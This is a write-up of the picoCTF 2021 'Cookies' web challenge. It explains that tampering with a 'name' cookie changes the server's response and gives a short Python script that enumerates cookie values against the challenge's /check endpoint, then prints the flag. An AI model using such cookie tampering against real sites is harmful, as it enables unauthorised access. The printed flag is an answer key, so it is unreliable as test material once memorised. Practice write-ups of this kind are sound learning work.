# picoCTF2021 Cookies Write Up

## Description

> Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:29649/

## Solution

The site provides an interface for searching cookies. Trying the prefilled string `snickerdoodle` results in the following output:

> That is a cookie! Not very special though...

Analysing the network traffic, we can see that the website initially has a cookie called name set to -1 which is then set to 0 after sending a POST request to the `/search` endpoint. Then a GET request is sent to the `/check` endpoint including this cookie value, resulting in the success page being loaded.

Using this information I tried setting the name cookie value to 1 before sending the POST request. This resulted in the same response, although this time for the cookie type chocolate chip. From here I decided to iterate over the integers from 1 to 100, setting each one to the value of the name cookie and observe if the flag popped up. A simple script to do this is below:

```python
import requests
from time import sleep
for i in range(1, 100):

    header = {'Cookie': f'name={i}'}
    sleep(0.2)
    response = requests.get('http://mercury.picoctf.net:29649/check', headers=header)
    if b'picoCTF{' in (response.content or response.headers):        
        print(response.content)
        print(response.headers)
        break
```

This eventually revealed the flag:

```
picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}
```
